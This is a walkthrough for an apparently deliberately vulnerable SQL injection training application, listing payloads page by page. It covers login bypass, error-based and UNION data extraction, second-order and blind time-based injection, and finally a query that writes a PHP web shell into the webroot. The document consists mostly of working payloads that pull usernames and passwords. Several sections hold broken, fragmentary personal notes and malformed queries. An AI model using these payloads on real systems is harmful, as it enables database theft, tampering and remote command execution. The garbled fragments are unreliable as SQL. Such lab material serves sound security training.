# Walkthrough document
This document explains the different attacks that can be done on this setup

## Registration
Use the register.php to create users

## Login bypass attack
Bypassing login using boolean expressions

1. **Page:** login1.php
   **Attack:**

```
- ' OR 1=1 -- //
- admin' OR 1=1 -- //
```

2. **Page:** login2.php
    **Attack:**

```
- admin') -- //  
```

## Verbose SQL Error based Injection
Forcing error conditions to reveal and extract data
1. **Page:** login1.php
   **Attack:**

```
- ' or 1 in (select @@version) -- //
- ' or 1=CAST((select group_concat(table_name) from information_schema.columns) AS SIGNED) -- //
- ' or 1 in (select password from users where username = 'admin') -- //
```

## Extracting data using UNION queries
Using a pre existing SQL select query to fetch additional data from the DB
1. **Page:** searchproducts.php
   **Attack:**

```
- ' order by 5 -- //
- ' union select 1,2,3,4,5 -- //
- ' union select null, null, database(), user(), @@version -- //
- ' union select null, table_name, column_name, table_schema, null from information_schema.columns -- //
- ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
- ' union select null, id, username, password, fname from users -- //
```

rom users limit 0,100)a-

' union select null, null, null, null, update products set products.price=88999 from sqlitraining.products -- //
update sqlitrainingproducts set price='88999' where product_name=pillows;
 ?user=admin' and substring((select table_name from information_schema.columns where column_name = 'ganteng' LIMIT 1),1,1)>'a' -- //

' union select null, null, null, null, and




## Second order SQL injection
User input is stored and reused as is in a different function that has no protection
1. **Page:** secondorder_register.php
**Attack:**

```
- ' or 1 in (select @@version) -- //
- ' or 1 in (select password from users where username='admin') -- //
- ' or 1 in (select convert(password,unsigned) from users where username='admin') -- //

- navigate to secondorder_changepass.php
```


' or 2 in (select password from users where id=67) -- //
UPDATE `users` SET `password` = MD5('admin') WHERE `users`.`id` = 1;


' or 2 in (INSERT INTO users VALUES (NULL, 'maulana', 'ganteng', 'ganteng', 'ganteng') -- //
<!-- INSERT INTO `users` (`id`, `username`, `password`, `fname`, `description`) VALUES (NULL, 'maulana', 'ganteng', 'ganteng', 'ganteng'); -->


## Blind SQL injection
1. **Page:** blindsqli.php
**Attack:**

```
- ?user=1' and 1=1 -- //
- ?user=admin' and substring((select table_name from information_schema.columns where column_name = 'ganteng' LIMIT 1),1,1)>'a' -- //
admin' and substring((select table_name from information_schema.columns where column_name = 'fname' LIMIT 1),1,1)>'' -- //

- ?user=1' union select 1,2,3,4, if (substring(username,1,1) > 'd', benchmark(100000000, encode('txt','secret')),null) from users where id=1 -- //

// my methode
1' union select 1,2,3,4,5 -- //
1' union select 1,2,3,4,database() -- //
  version();
  database();
  1' union select 1,2,3,4,table_name+from+information_schema.tables -- //
  1' union select 1,2,3,4,group_concat(table_name)+from+information_schema.tables+where+table_schema=database() -- //
  1' union select 1,2,3,4,group_concat(column_name)+from+information_schema.columns+where+table_name=users -- //
  1' union select 1,2,3,4,group_concat(column_name)+from+information_schema.columns+where+table_name=0x7573657273 -- //
  1' union select 1,2,3,4,group_concat(username,0x3a,password)+from sqlitraining.users -- //

  user : 75 73 65 72 73

  1' union select 1,2,3,4,concat_ws(0x3a,username, password)+from+users limit 0,10 -- //
  1' union select 1,2,3,4,group_concat(table_name)+from+users limit 0,10 -- //



 1' union select 1,2,3,4,group_concat(username,0x3a,password)+from sqlitraining.users -- //

,group_concat(username,0x3a,password,0x3a,is_admin,0x3a)+from sqlitrainingctf.users -- //
tabel :
https://www.rapidtables.com/code/text/ascii-table.html




```

## OS interaction
1. **Page:** os_sqli.php
**Attack:**

```
- ?user=qqqq' union select null, null, null, '<pre><?php system($_GET[\'cmd\']); ?></pre>', null into outfile '/path/to/webroot/writable/dir/shell.php' -- //
```
